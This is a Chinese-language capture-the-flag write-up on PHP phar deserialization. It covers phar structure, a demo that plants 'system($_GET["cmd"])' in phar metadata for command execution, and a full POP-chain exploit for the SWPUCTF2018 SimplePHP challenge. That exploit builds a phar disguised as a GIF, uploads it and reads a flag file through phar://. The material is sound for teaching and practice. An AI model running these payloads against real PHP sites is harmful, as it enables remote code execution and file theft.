@@ -1,0 +1,460 @@
+> 代码块中的 "\" 可以忽略
+
+## 初始phar
+
+### 概念
+
+>
+> **phar是一种类似于jar的打包文件，但是实际上是一种压缩文件，php5.3版本或以上都默认开启，可以将多个文件压缩成一个phar文件，phar不需要依赖unserialize函数就可以进行反序列化操作，使用phar伪协议读取文件会将文件中的meta-> data数据进行一次反序列化操作。同时php中已经内置了一个phar类用于处理相关的操作**
+
+### 四大主要组成部分
+
+  * a stub
+
+> 可以理解成标识，必须以**`__HALT_COMPILER();?>`** 结尾，否则不会被识别为phar文件，结尾前的内容不限，比如可以是：
+> **`xxx\<?php xxx;__HALT_COMPILER();?>`**
+
+  * a manifest describing the contents
+
+> phar文件中本质上是一个压缩文件，所以这一部分会放一些压缩文件的一些信息，其中meta-data就是以序列化的形式存储在这里，这个也是漏洞执行的关键点
+
+  * the file contents
+
+> 被压缩的文件内容，在没有特殊要求的情况下，可以随便写，反正最终我们只是需要序列化出我们想要得到内容就行了
+
+  * a signature for verifying Phar integrity
+
+> 签名格式
+
+![wKg0C2LrmReAXdCYAABrLE6iA3E461.png](https://image.3001.net/images/20220922/1663835993_632c1f595d46f30806a9b.png!small)
+
+### 受影响函数
+
+> php部分函数在通过伪协议phar://解析phar文件时，会触发反序列化，会将meta-data进行反序列化，受影响的函数如下：
+
+![wKg0C2LrmSuAQ5cAABnDHedzQ340.png](https://image.3001.net/images/20220922/1663835993_632c1f59df878c20a82a3.png!small)
+
+### 举个例子
+
+实验开始之前，确保
+
+  * php 版本等于或者高于5.3
+  * php.ini中的phar.readonly设置为Off（默认为On）
+
+    
+    
+    //生成phar文件
+    <?php
+    class AnyClass{
+        var $output = '';
+        function __construct(){
+            echo '生成完成...';
+        }
+    }
+    $phar = new Phar('phar.phar');  //被生成的文件，必须是phar做为后缀名
+    $phar -> stopBuffering();
+    $phar -> setStub('<?php __HALT_COMPILER();?>'); //phar标志，必须以__HALT_COMPILER();?>结尾，前面的内容随便
+    $phar -> addFromString('vfree.txt','vfree');  //要写入的文件和文件内容
+    $object = new AnyClass();   //初始化类
+    $object -> output= 'system($_GET["cmd"]);';  //往类里面的output变量写入systemxxx
+    $phar -> setMetadata($object);  //将meta-data写入manifest
+    $phar -> stopBuffering();
+    
+
+运行这个php文件后，会在当前目录下生成一个vfree.phar文件
+
+构造下面的语句，使用受影响的函数包含phar文件
+
+    
+    
+    <?php
+    show_source(__FILE__);
+    \$filename=\$_GET['filename'];
+    class AnyClass{
+        var \$output = 'echo "ok";';
+        function __destruct()
+        {
+            eval(\$this->output);
+        }
+    }
+    file_exists('phar://phar.phar/vfree.txt')
+    
+
+访问文件，就可以进行RCE，vfree.txt的作用好像没啥用，就是为了输出addFromstring第二位的vfree！！！  
+![wKg0C2LrmbGAR7vZAADoXHWGiaI507.png](https://image.3001.net/images/20220922/1663835994_632c1f5a5dd6b1518c029.png!small)
+
+# 实战：[SWPUCTF2018]SimplePHP
+
+题目链接：**[BUUCTF在线评测 (buuoj.cn)](https://www.sec-in.com/outLinkPage/?target=https://buuoj.cn/challenges#%5BSWPUCTF%202018%5DSimplePHP)
+
+### 题解
+
+**打开文件有两个利用点，一个是查看文件的，还有一个是上传文件，一般老师傅看到查看文件的第一眼就会考虑到任意文件读取漏洞，这里尝试读取一下index.php**
+
+![wKg0C2LrllSAFuVvAAA8BYWy3Jc229.png](https://image.3001.net/images/20220922/1663835994_632c1f5ae2fefada7b05c.png!small)
+
+ **发现index.php下include了一个base.php，包含看看啥也没，但是底下有一个f1ag.php**
+
+![wKg0C2LrlmCAduz5AACciQolqbg086.png](https://image.3001.net/images/20220922/1663835995_632c1f5b5ca69910f48b9.png!small)
+
+ **包含f1ag.php，返回hacker，说明给过滤了**
+
+![wKg0C2LrlmmARYfGAAAftc4BsMw934.png](https://image.3001.net/images/20220922/1663835995_632c1f5bc9d213f90ccdf.png!small)
+
+ **继续读取file.php看看，新发现了两个文件和网站的绝对路径，继续包含**
+
+![wKg0C2LrlnOALmTlAACgJcToVk949.png](https://image.3001.net/images/20220922/1663835996_632c1f5c401f61b77694a.png!small)
+
+ **最主要的两个文件：function.php和class.php**
+
+>  **function.php**
+    
+    
+    <?php
+    //show_source(__FILE__);
+    include "base.php";
+    header("Content-type: text/html;charset=utf-8");
+    error_reporting(0);
+    function upload_file_do() {
+       global \$_FILES;
+       \$filename = md5(\$_FILES["file"]["name"].\$_SERVER["REMOTE_ADDR"]).".jpg";
+       //mkdir("upload",0777);
+       if(file_exists("upload/" . \$filename)) {
+           unlink(\$filename);
+       }
+       move_uploaded_file(\$_FILES["file"]["tmp_name"],"upload/" . \$filename);
+       echo '\<script type="text/javascript">alert("上传成功!");\</script>';
+    }
+    function upload_file() {
+       global \$_FILES;
+       if(upload_file_check()) {
+           upload_file_do();
+       }
+    }
+    function upload_file_check() {
+       global \$_FILES;
+       \$allowed_types = array("gif","jpeg","jpg","png");
+       \$temp = explode(".",\$_FILES["file"]["name"]);
+       \$extension = end(\$temp);
+       if(empty(\$extension)) {
+           //echo "\<h4>请选择上传的文件:" . "\<h4/>";
+       }
+       else{
+           if(in_array(\$extension,\$allowed_types)) {
+               return true;
+           }
+           else {
+               echo '\<script type="text/javascript">alert("Invalid file!");\</script>';
+               return false;
+           }
+       }
+    }
+    ?>
+    
+
+**function.php文件主要是控制上传的，文件名命名控制语句：**
+
+    
+    
+    \$filename = md5(\$_FILES["file"]["name"].\$_SERVER["REMOTE_ADDR"]).".jpg";  
+    
+    
+
+**文件存储语句：**
+
+    
+    
+    move_uploaded_file(\$_FILES["file"]["tmp_name"],"upload/" . \$filename);  
+    
+    
+
+**check语句：**
+
+    
+    
+    \$allowed_types = array("gif","jpeg","jpg","png");
+    \$temp = explode(".",\$_FILES["file"]["name"]);
+    
+    
+
+> **所以上传的路径是在当前目录的upload文件夹下，只能上传图片文件格式的文件**
+
+ **继续跟进审计class.php文件**
+
+>  **class.php**
+    
+    
+    \<?php
+    class C1e4r
+    {
+       public \$test;
+       public \$str;
+       public function __construct(\$name)
+       {
+           \$this->str = \$name;
+       }
+       public function __destruct()
+       {
+           \$this->test = \$this->str;
+           echo \$this->test;
+       }
+    }
+    
+    class Show
+    {
+       public \$source;
+       public \$str;
+       public function __construct(\$file)
+       {
+           \$this->source = \$file;   //\$this->source = phar://phar.jpg
+           echo \$this->source;
+       }
+       public function __toString()
+       {
+           \$content = \$this->str['str']->source;
+           return \$content;
+       }
+       public function __set(\$key,\$value)
+       {
+           \$this->\$key = \$value;
+       }
+       public function _show()
+       {
+           if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',\$this->source)) {
+               die('hacker!');
+           } else {
+               highlight_file(\$this->source);
+           }
+           
+       }
+       public function __wakeup()
+       {
+           if(preg_match("/http|https|file:|gopher|dict|\.\./i", \$this->source)) {
+               echo "hacker~";
+               \$this->source = "index.php";
+           }
+       }
+    }
+    class Test
+    {
+       public \$file;
+       public \$params;
+       public function __construct()
+       {
+           \$this->params = array();
+       }
+       public function __get(\$key)
+       {
+           return \$this->get(\$key);
+       }
+       public function get(\$key)
+       {
+           if(isset(\$this->params[\$key])) {
+               \$value = \$this->params[\$key];
+           } else {
+               \$value = "index.php";
+           }
+           return \$this->file_get(\$value);
+       }
+       public function file_get(\$value)
+       {
+           \$text = base64_encode(file_get_contents(\$value));
+           return \$text;
+       }
+    }
+    ?>
+    
+    
+
+#### 分析
+
+  *  **class.php有两个文件操作的函数，一个是highlight_file和file_get_contents**
+  *  **有三个类，分别是C14er，Show和Test，先从C14er审计：**
+
+>  **C14er类**
+    
+    
+    class C1e4r
+    {
+       public \$test;
+       public \$str;
+       public function __construct(\$name)
+       {
+           \$this->str = \$name;
+           //construct魔术方法初始化了str的值等于\$name
+       }
+       public function __destruct()
+       {
+           \$this->test = \$this->str;
+           echo \$this->test;
+           //destruct魔术方法赋值了\$this->test等于\$this->str，然后输出\$this->test
+       }
+    }
+    
+    
+
+> **Show类**
+    
+    
+    class Show
+    {
+       public \$source;
+       public \$str;
+       public function __construct(\$file)
+       {
+           \$this->source = \$file;   //\$this->source = phar://phar.jpg
+           echo \$this->source;   //    已经告诉了这是一个phar反序列化
+       }
+       public function __toString()
+       {
+           //这里的魔术方法作用就是如果使用输出字符串的方式输出类的实例化，就会促发__toString，也就是会执行这里。
+           \$content = \$this->str['str']->source;
+           // 调用了自己的source
+           return \$content;
+       }
+       public function __set(\$key,\$value)
+       {
+           \$this->\$key = \$value;
+       }
+       public function _show()
+       {
+           //这里定义了文件包含过滤的字符串，包含了f1ag.php，所以不能直接包含flag所在的文件
+           if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',\$this->source)) {
+               die('hacker!');
+           } else {
+               highlight_file(\$this->source);
+           }
+           
+       }
+       public function __wakeup()
+       {
+           if(preg_match("/http|https|file:|gopher|dict|\.\./i", \$this->source)) {
+               echo "hacker~";
+               \$this->source = "index.php";
+           }
+       }
+    }
+    
+    
+
+> **Test类**
+    
+    
+    class Test
+    {
+       public \$file;
+       public \$params;
+       public function __construct()
+       {
+           \$this->params = array();
+           //初始化一个params为数组
+       }
+       public function __get(\$key)
+       {
+           //如果调用了类里面的一个不存在或者私有的内容时，就会触发__get魔术方法
+           return \$this->get(\$key); // 这里继续调用了get()，继续跟进
+       }
+       public function get(\$key)
+       {
+           if(isset(\$this->params[\$key])) {
+               \$value = \$this->params[\$key];
+               // 如果设置了params[\$key]的话，那么\$value就等于设置的文件
+           } else {
+               \$value = "index.php";
+           }
+           return \$this->file_get(\$value);
+           //这里继续调用了file_get(\$value)，继续跟进
+       }
+       public function file_get(\$value)
+       {
+           \$text = base64_encode(file_get_contents(\$value));
+           // 到了这里，就可以读取我们传入的文件了
+           return \$text;
+       }
+    }
+    
+    
+
+**对于一些代码的解释已经注释在了代码中的后面。**
+
+#### 关系
+
+**首先C1e4r类中的析构函数中，使用了echo输出**`$this->test`，test时可控的，在后面的Show类也有一个toString魔术方法，这个方法中定义的`$content
+=
+$this->str['str']->source`可以触发Test类的__get魔术方法，所以我们要在`\$this->test`传入一个可以触发toString的内容，然后在传入一个str触发Test的__
+**get**
+
+#### 链
+
+    
+    
+    C14er->test => Show->__toString => Test->__get->get->file_get
+    
+    
+
+#### EXP编写
+
+    
+    
+    \<?php
+    class C1e4r{
+       public \$test;
+       public \$str;
+    }
+    class Show{
+       public \$source;
+       public \$str;
+    }
+    class Test{
+       public \$file;
+       public \$params;
+    }
+    \$c1e4r = new C1e4r();
+    \$show = new Show();
+    \$test = new Test();
+    \$c1e4r->str = \$show;  // 触发Show类的__toString
+    \$show->str['str'] = \$test;  //触发Test类的__get，因为在Test并没有定义source，所以Test的__get会被触发
+    \$test->params['source'] = '/var/www/html/f1ag.php'; //要读取的文件
+    
+    //生成phar文件基本上用下面这一段代码
+    \$phar = new Phar('vfree.phar'); //必须是phar为后缀
+    \$phar -> startBuffering(); //开始写入
+    \$phar -> setStub('GIF89A'.'\<?php __HALT_COMPILER();?>');  
+    /*必须以__HALT_COMPILER();?>结尾，否则不会被识别出是phar文件，前面的内容随便*/
+    \$phar -> addFromString('vfree.txt','vfree');  //随便写
+    \$object = \$c1e4r;  
+    \$phar -> setMetadata(\$object);  //将meta-data写入缓存中
+    \$phar -> stopBuffering(); //停止写入，并且创建输出一个phar文件，这里生成了vfree.phar
+    
+    
+
+**编写后访问exp文件，会在当前文件创建一个vfree.phar的文件，由于只能上传图片文件，所以要把phar后缀改成gif上传上去。**
+
+![wKg0C2LrlpCAP8d4AAARr5c4zVc503.png](https://image.3001.net/images/20220922/1663835996_632c1f5cab544f0917896.png!small)
+
+![wKg0C2Lrlp2AIj3kAAAXmEWgvUo590.png](https://image.3001.net/images/20220922/1663835997_632c1f5d1b6652ab4f447.png!small)
+
+ **上传**
+
+![wKg0C2LrlqWAPow9AAA5eKkQkU297.png](https://image.3001.net/images/20220922/1663835997_632c1f5d7d26e9b814706.png!small)
+
+ **这里开了目录访问的权限，访问upload/**
+
+![wKg0C2LrlqyAHGJ7AACGLfp14c837.png](https://image.3001.net/images/20220922/1663835998_632c1f5e2af40083a7ce1.png!small)
+
+ **使用phar伪协议访问**`66314f775270c74b6790f90c8d7167a8.jpg`，访问url
+
+    
+    
+    http://xxxxxxxxx/file.php?file=phar://upload/66314f775270c74b6790f90c8d7167a8.jpg
+    
+    
+
+![wKg0C2LrlraAWYs9AAAvy5BmSQ795.png](https://image.3001.net/images/20220922/1663835998_632c1f5e9322b3057cb27.png!small)
+
+![wKg0C2LrlsCAcE9sAABTgJXPF0204.png](https://image.3001.net/images/20220922/1663835999_632c1f5f0cc9e53b52fcb.png!small)
+
+# 总结
+
+一个比较简单的phar反序列化，通过构造POP链去写对应的EXP，一步一步实现每一个类的调用，最终通过触发Test的__get魔术方法，一步一步到最后的file_get_contents函数读取文件。这里提一个第一次编写exp时出现的一个问题，就是在指定flag文件的时候，`\$test->params['source']='/var/www/html/f1ag.php'`中的source不能替换成其他的值，忽略了这个数组的键不是可控的，刚开始写了file，一直没成功，换成source就好了，因为触发__get魔术方法要带上一个参数，而source就是我们带上的参数，具体的魔术方法学使用方法可以自行百度一下。
+
